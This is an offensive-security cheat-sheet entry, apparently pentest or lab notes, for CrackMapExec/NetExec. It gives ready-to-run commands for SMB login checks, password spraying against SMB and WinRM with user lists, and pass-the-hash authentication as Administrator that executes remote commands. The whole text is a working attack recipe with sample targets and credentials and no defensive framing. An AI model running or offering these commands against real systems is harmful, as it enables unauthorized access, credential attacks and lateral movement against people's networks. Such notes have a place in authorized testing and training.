---
title: CrackMapExec / NetExec - SMB Login Spray
category: initial-access
subcategory: bruteforce
os: linux
command: crackmapexec smb target -u users -p pass --continue-on-success
tools: crackmapexec, netexec
---


### SMB login check

```bash
crackmapexec smb 10.10.253.194 -u 'twilliams' -p 'roastpotatoes'
```

### Spray multiple users

```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

### Spray over WinRM

```bash
crackmapexec winrm 192.168.192.142 -u UserList.txt -p 'Password@123'
```

### Pass-the-hash with command exec

```bash
crackmapexec smb 10.2.24.12 -u Administrator -H "12214fedsdfs31233r2fd"
crackmapexec smb 10.2.24.12 -u Administrator -H "12214fedsdfs31233r2fd" -x "ipconfig"
crackmapexec smb 10.2.24.12 -u Administrator -H "12214fedsdfs31233r2fd" -x "net user"
```
